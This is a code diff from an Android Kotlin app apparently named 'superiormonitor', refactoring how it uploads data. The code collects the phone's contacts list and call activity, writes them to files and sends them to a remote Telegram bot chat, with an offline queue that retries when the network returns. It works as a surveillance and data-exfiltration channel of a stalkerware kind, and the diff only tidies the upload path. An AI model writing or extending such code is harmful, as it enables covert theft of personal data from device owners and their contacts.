@@ -3,9 +3,9 @@ package com.system.superiormonitor.monitor
 import android.content.Context
 import android.provider.ContactsContract
 import com.system.superiormonitor.bot.TelegramApi
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogManager
-import com.system.superiormonitor.util.LogLevel
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogManager
+import com.system.superiormonitor.core.LogLevel
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -87,30 +87,28 @@ object FetchOperations {
                     com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchGeneratingMessage()
                 )
 
-                if (TelegramApi.isApiReachable(context, botToken)) {
-                    val caption = com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchSuccessMessage("Contacts", contactsList.size)
-                    val uploaded = TelegramApi.sendDocument(botToken, chatId, outputFile, caption = caption)
-                    
-                    if (uploaded) {
-                        LogManager.log(LogCategory.BOT_ACTIVITY, "[SENTMSG] Successfully uploaded Contacts file.")
-                        outputFile.delete()
-                        TelegramApi.editMessageText(
-                            botToken, chatId, messageId,
-                            com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchCompletedMessage("contacts"),
-                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildContactsMarkup()
-                        )
-                    } else {
-                        LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram upload failed for Contacts.", LogLevel.ERROR)
-                        outputFile.delete()
-                        TelegramApi.editMessageText(
-                            botToken, chatId, messageId,
-                            com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("Telegram API Upload Failed."),
-                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildContactsMarkup()
-                        )
-                    }
+                val caption = com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchSuccessMessage("Contacts", contactsList.size)
+                val uploaded = com.system.superiormonitor.bot.MediaUploader.uploadDocument(
+                    context = context,
+                    token = botToken,
+                    chatId = chatId,
+                    file = outputFile,
+                    caption = caption,
+                    fallbackOfflineSubdir = "fetchops/contacts"
+                )
+                
+                if (uploaded) {
+                    TelegramApi.editMessageText(
+                        botToken, chatId, messageId,
+                        com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchCompletedMessage("contacts"),
+                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildContactsMarkup()
+                    )
                 } else {
-                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag Device offline. Moved contacts to offline queue.")
-                    com.system.superiormonitor.bot.OfflineManager.moveToOfflineQueue(context, outputFile, "fetchops/contacts", fileName)
+                    TelegramApi.editMessageText(
+                        botToken, chatId, messageId,
+                        com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("Network unreachable or API error. Queued for offline sync."),
+                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildContactsMarkup()
+                    )
                 }
 
             } catch (e: Exception) {
@@ -212,30 +210,28 @@ object FetchOperations {
                     com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchGeneratingMessage()
                 )
 
-                if (TelegramApi.isApiReachable(context, botToken)) {
-                    val caption = com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchSuccessMessage("Call Activity", callsList.size)
-                    val uploaded = TelegramApi.sendDocument(botToken, chatId, outputFile, caption = caption)
-                    
-                    if (uploaded) {
-                        LogManager.log(LogCategory.BOT_ACTIVITY, "[SENTMSG] Successfully uploaded Call Activity file.")
-                        outputFile.delete()
-                        TelegramApi.editMessageText(
-                            botToken, chatId, messageId,
-                            com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchCompletedMessage("call activity"),
-                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildCallActivityMarkup()
-                        )
-                    } else {
-                        LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram upload failed for Call Activity.", LogLevel.ERROR)
-                        outputFile.delete()
-                        TelegramApi.editMessageText(
-                            botToken, chatId, messageId,
-                            com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("Telegram API Upload Failed."),
-                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildCallActivityMarkup()
-                        )
-                    }
+                val caption = com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchSuccessMessage("Call Activity", callsList.size)
+                val uploaded = com.system.superiormonitor.bot.MediaUploader.uploadDocument(
+                    context = context,
+                    token = botToken,
+                    chatId = chatId,
+                    file = outputFile,
+                    caption = caption,
+                    fallbackOfflineSubdir = "fetchops/calls"
+                )
+                
+                if (uploaded) {
+                    TelegramApi.editMessageText(
+                        botToken, chatId, messageId,
+                        com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchCompletedMessage("call activity"),
+                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildCallActivityMarkup()
+                    )
                 } else {
-                    LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]$tag Device offline. Moved call activity to offline queue.")
-                    com.system.superiormonitor.bot.OfflineManager.moveToOfflineQueue(context, outputFile, "fetchops/calls", fileName)
+                    TelegramApi.editMessageText(
+                        botToken, chatId, messageId,
+                        com.system.superiormonitor.bot.BotMessages.FetchOps.buildFetchFailedMessage("Network unreachable or API error. Queued for offline sync."),
+                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.FetchOps.buildCallActivityMarkup()
+                    )
                 }
 
             } catch (e: Exception) {
